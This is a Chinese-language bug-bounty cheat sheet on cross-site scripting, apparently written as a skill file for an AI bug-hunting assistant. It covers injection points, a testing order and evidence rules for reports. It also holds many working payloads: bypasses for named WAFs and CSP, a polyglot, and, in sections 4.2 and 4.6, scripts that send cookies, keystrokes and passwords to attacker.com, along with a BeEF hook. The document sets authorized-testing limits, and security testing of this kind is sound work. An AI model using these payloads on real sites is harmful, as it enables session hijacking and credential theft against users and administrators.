# 跨站脚本（XSS）

> 把「用户输入」当「HTML/JS 代码」在受害者浏览器执行。存储型（尤其盲打管理后台）= 高/严重，反射型多数平台 P3 甚至拒收。SRC 里存储型管理后台 XSS = P1（$300–$3k）；能不能拿到更高赏金取决于「脚本在哪跑、谁看到、能偷到什么」（详见 §4.5 升级链）。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（174 份公开报告提炼）
- [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)（源自 SnailSploit/offensive-checklist）
- 权威公开源：PayloadsAllTheThings / PortSwigger / HackTricks / OWASP

---

## 1. 触发信号

- 自己的输入原样出现在响应正文 / 评论框 / 个人简介 / DOM 操作里
- 输入 `aaa"bbb'ccc<ddd>eee` 后观察哪些字符被转义（`<`→`&lt;` 说明编码正常，未转义则危险）
- 页面 JS 里出现 `document.write(` `innerHTML=` `location.hash` `eval(` 等危险 sink
- 后台 / 工单 / 日志系统渲染用户可控字段（盲打场景）

## 2. 高频入口点

**高频输出点**（按 WooYun 案例，见本地 src-hunter xss/00-index §2）：

| 输出点 | 触发方式 | 典型 |
|---|---|---|
| 用户昵称 / 签名 | 页面加载 | 个人主页、评论 |
| 搜索回显 | 搜索 | 历史 / 结果页 |
| 评论 / 留言 | 展示 | 论坛、商品评价 |
| 文件名 / 描述 | 列表 | 网盘、相册 |
| 邮件正文 / 标题 | 打开 | 邮箱系统 |
| URL 参数回显 | 渲染 | 分享链接 |
| 订单备注 | 后台查看 | 电商工单 |
| API 回调参数 | JS 执行 | JSONP |

**易遗漏点**：HTTP 头反射（`X-Forwarded-For` → 日志后台、`User-Agent` → 统计面板）；APP 写入 → Web 显示；草稿箱 / 审核列表二次渲染；`/api/data?cb=alert(1)` 类 JSON 注入。

**URL 特征**（hunt-xss 攻击面信号 `[Claude-BugHunter]`）：`/admin*` `/settings*` `/wiki*` `/reports*` `?utm_source=` `?redirect=` `?q=` `?search=` `?callback=` `?return_url=` `/render*` `/preview*` `/documentation*`。

**弱防护头信号**：`Content-Type: text/html`（无 nosniff）、CSP 缺失或含 `unsafe-inline`、`Content-Type: image/svg+xml`（CSP 常不生效）、`X-XSS-Protection: 0`。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **先验回显**：发唯一数字 canary（如 `alert(91234)`，别用 `alert(1)`——练习页面里满是示例 payload），用 `curl ... | grep CANARY` 看是否原样回显 `[Claude-BugHunter]`。
2. **识别上下文**（决定闭合方式，见 4.1）：HTML 标签内 / 属性内 / URL 属性 / JS 字符串 / JS JSON / CSS。
3. **最小无副作用 payload**：`<svg onload=alert(document.domain)>` 弹窗，用 DevTools 确认 `<script>` 未转义才执行。
4. **被拦则降级到 Bypass**：换标签 / 事件 / 编码 / 大小写（见 4.3），或被 CSP 拦 → 找 JSONP / unsafe-eval（见 4.3）。
5. **存储点盲打**：在后台可见字段埋 `<script src=https://your-xss-hunter.com/abc></script>`，挂 XSS Hunter 等回调，等管理员触发。
6. **评估升级**（仅证明，不实际执行）：cookie 是否 HttpOnly、可否 CSRF / 改密码 / 读页面（见 4.5）。

## 4. Payload 区（每条标注出处）

### 4.1 基础探测（按上下文）`[本地 src-hunter]`

**HTML 标签内**：
```html
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

**属性内（闭合引号）**：
```
" onmouseover=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
```

**JS 字符串 / JSON**：
```js
';alert(1);//          // 字符串闭合
'-alert(1)-'           // JSON 上下文
</script><script>alert(1)</script>   // 提前闭合 script 块
```

**URL 属性**：
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**无害字符探针** `[Claude-BugHunter]`：`aaa"bbb'ccc<ddd>eee` — 观察哪些被转义、哪些原样。

### 4.2 盲打 / 存储型 `[本地 src-hunter]`

```html
<script src=https://your-xss-hunter.com/abc></script>   <!-- 盲打回调 -->
<img src=x onerror=alert(1) style="display:none">        <!-- 隐蔽存储 -->
<script>var s=document.createElement("script");s.src="http://attacker.com/evil.js";document.body.appendChild(s)</script>  <!-- 持久化 -->
```

**盲打埋点** `[Claude-BugHunter]`：错误消息 `?ErrorMessage=`、认证流 `?Source=`/`?ReturnUrl=`、登录失败用户名（管理员查审计日志）、`User-Agent` / `Referer`（部分 SOC/分析面板渲染为 HTML）、注册邮箱、上传文件名。回调需带 sink 子标签（`bxss-err-<random>.<collab>`）。

### 4.3 Bypass 矩阵 `[本地 src-hunter]`

| 拦 | 绕 |
|---|---|
| 标签拦 `<script>` | `<svg>` `<img>` `<details>` `<marquee>` `<video>` `<body>` |
| `script` 关键字 | `<scr<script>ipt>`（双写）/ `<sCrIpT>`（大小写）/ 注释混淆 `<svg on<!--test-->load=alert(1)>` |
| `alert` 关键字 | `confirm` / `prompt` / `top.alert` / `Function('alert(1)')()` / `window['al'+'ert'](1)` / `eval(atob('YWxlcnQoMSk='))` |
| 引号过滤 | 无引号属性 `<img src=x onerror=alert(1)>` |
| 括号过滤 | 模板字符串 `alert\`1\`` |
| 编码 | HTML 实体 `&#60;script&#62;` / 16 进制 `&#x3c;` / URL `%3c` / 双重 URL `%253c` / Unicode `alert(1)` / UTF-16 |
| 长度限制 | 外链 `<script src=//xss.cc/j>` |
| HttpOnly | 读不到 cookie，但仍可 CSRF / 钓鱼 / 改密码 |

**WAF 产品绕过** `[Claude-Red]`：Cloudflare `<svg><animateTransform onbegin=alert\`1\`>`；Akamai Unicode 归一化 `<img src=x onerror="alert(1)">`；AWS WAF 嵌套编码 `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E...">`；Imperva HTML 实体 `<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">`；F5 `<svg/onload=alert(1)//`；Wordfence `<base href="javascript:/a/-alert(1)//">`。

**CSP 绕过思路** `[本地 src-hunter]`：①含 `unsafe-inline` → 直接 inline；②含 `unsafe-eval` → `eval`/`Function`；③白名单域有 JSONP → `<script src="//allowed/jsonp?callback=alert(1)">`；④`base-uri` 缺失 → `<base href="//attacker.com">`；⑤dangling markup 无脚本 → `<img src='//attacker.com/?`。AngularJS CDN gadget `[Claude-BugHunter]`：`<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>`。JSONP 实例 `[本地 src-hunter]`：`<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>`、`cdnjs.cloudflare.com/ajax/libs/angular.js`。

**mXSS（解析差异）** `[本地 src-hunter]`：`<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`；`<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>`；DOM clobbering `<form id=x></form><form id=x><img src=x onerror=alert(1)></form>`。

**Polyglot（不确定上下文时）** `[本地 src-hunter]`：
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### 4.4 DOM XSS 危险源 / 汇 `[本地 src-hunter]`

```js
// 源（攻击者可控）
location.href / location.search / location.hash / document.referrer / window.name / postMessage data
// 汇（执行点）
eval()  Function()  setTimeout(string)  setInterval(string)
innerHTML / outerHTML / insertAdjacentHTML / document.write / $('...') / .html(...)
```

测试：`https://target/page.html#<img src=x onerror=alert(1)>`（改 hash）；`parent.postMessage('<img src=x onerror=alert(1)>','*')`（跨窗口）。

### 4.5 利用 / 升级链 `[Claude-BugHunter]`

- **反射 XSS + 缓存投毒 → 持久化**：找可缓存响应 + unkeyed 输入（`X-Forwarded-Host`、`X-Original-URL`）注入 payload，所有 CDN 访客命中（Glassdoor 反射→存储，H1 #1424094）。
- **Self-XSS + CSRF → ATO**：自己资料字段 self-XSS，配一个无 token 的 CSRF 改字段，诱受害者访问即触发。
- **DOM XSS on /signin 或 /oauth 回调 → 偷 URL fragment 里的 token**：`document.location.hash` 未转义，读 access_token base64 后 `Image()` 外带。
- **SVG 上传 + CSP 绕过 → 同源执行**：SVG 响应常不受页面 CSP 约束，同源存储即拿到会话 cookie。
- **postMessage XSS + origin 校验缺失 → 跨域外带**：`event.origin` 用 `indexOf`/`endsWith` 校验可被 `target.com.attacker.com` 绕过。
- 升级问句：脚本在哪跑、谁看到 → 有状态变更端点或 token 可访问即 ATO，链式赏金是单独 XSS 的 5–20 倍。

### 4.6 落地利用 payload（仅无副作用证明用）`[本地 src-hunter]`

```html
<!-- cookie 窃取（self-cookie 演示即可，勿偷真实用户） -->
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
<script>navigator.sendBeacon("http://attacker.com/steal", document.cookie)</script>

<!-- 键盘记录（存储型 + 有敏感输入页才提价值） -->
<script>document.addEventListener("keypress",function(e){new Image().src="http://attacker.com/log?key="+e.key})</script>

<!-- 表单窃取 -->
<script>document.querySelectorAll("input[type=password]").forEach(function(i){i.addEventListener("change",function(){new Image().src="http://attacker.com/log?pwd="+this.value})})</script>

<!-- BeEF hook（授权内网评估才部署，SRC 报告不落地） -->
<script src="http://beef-server:3000/hook.js"></script>
```

### 4.7 真实案例锚点 `[本地 src-hunter]`

H1 已披露 High/Critical 命中本类 335 份，weakness 分布：Stored 166 / Generic 74 / Reflected 51 / DOM 29。代表：GitLab Stored XSS in Wiki（#526325）、Valve Steam chat client（#409850，$7,500）、GitLab DesignReferenceFilter（#1212067，$16,000）、GitLab Kroki diagram（#1731349，$13,950）、Reddit redirect 参数 XSS（#1962645，$5,000）、CS Money 图片上传盲打（#1010466）、X/xAI 内部面板盲打（#1207040）。

## 5. 工具用法

```bash
# 手工验回显（唯一 canary）
curl -sk "https://target.com/search?q=XSS91234" | grep -i "XSS91234"

# 源码审计找 DOM sink / 危险 helper
grep -rn "innerHTML\|document\.write\|eval(\|location\.hash\|location\.search" --include="*.js"
grep -rn "html_safe\|raw(\|sanitize\|translate" --include="*.erb" --include="*.rb"   # Rails

# 参数收集 + 批量反射检测（gau/waybackurls + gf/gxss + dalfox）[Claude-Red]
echo "https://target.com" | waybackurls | grep "=" | qsreplace "<svg onload=alert(1)>" | dalfox pipe
```

扫描器 `[Claude-Red]`：Burp Active Scan（Reflector / DOM Invader 插件）、OWASP ZAP、XSStrike、XSSer；盲打平台 XSS Hunter / XSS.Report / Hookbin。
> 注意 `[Claude-Red]`：Chrome/Firefox/Safari 可能抑制跨域 iframe 或后台标签里的 `alert/confirm/prompt`——用 `console.log`、`fetch/XHR` 信标、或 DevTools 可见的 DOM 变更作可靠判据。

## 6. 证据要求

**「已确认」必须满足**：payload 以未转义尖括号出现在响应正文（`<script>alert(` 而非 `&lt;script&gt;`），且在真实浏览器执行（Chrome/Firefox 至少其一）。盲打/存储型必须以 OOB 回调为证——回调到唯一 Collaborator 子域、且触发 UA 是浏览器而非后端客户端；仅状态码变化 / 回显被 URL 或 HTML 编码 = 不是 XSS `[Claude-BugHunter]`。

**PoC 必备**：触发 URL（含 payload）+ alert 弹窗截图（含 URL bar）+ F12 DOM 内 payload 截图 + 至少 2 个浏览器 + CSP / `X-XSS-Protection` 头分析。

**CVSS 参考**（src-hunter xss/00-index §7.3）：存储 XSS（管理后台）6.1–8.0；存储 XSS（用户互看）6.1；反射 XSS（无认证）6.1；DOM XSS 6.1；mXSS / 邮件预览 6.5–8.1；盲打成功（admin 触发）7.5–8.5；Self-XSS 通常拒收。

**影响段模板**：写清「该参数无认证可访问、CSP 未限制 inline；实际可偷 cookie（无 HttpOnly 时）/ CSRF / 钓鱼；测试仅用 `alert(document.domain)` 证明，未做任何 cookie 偷取」。

## 7. 合规边界 / 不要做的事

- **禁**：实际偷取真实用户 cookie / token；self-cookie 演示即可。
- **禁**：用存储 XSS 在公开评论区埋 payload（他人会触发）；只在自己控制的字段测。
- **禁**：盲打到管理员 cookie 后用它登录——仅证明回调收到，截图后作废。
- **禁**：伪造真实钓鱼登录页、批量蠕虫式传播。
- **报告脱敏**：cookie / token 只留 head/tail。
- **报告纪律** `[Claude-BugHunter]`：未展示终端影响（ATO / token 外带 / 提权）的 XSS 按 Medium 报，不报 Critical。
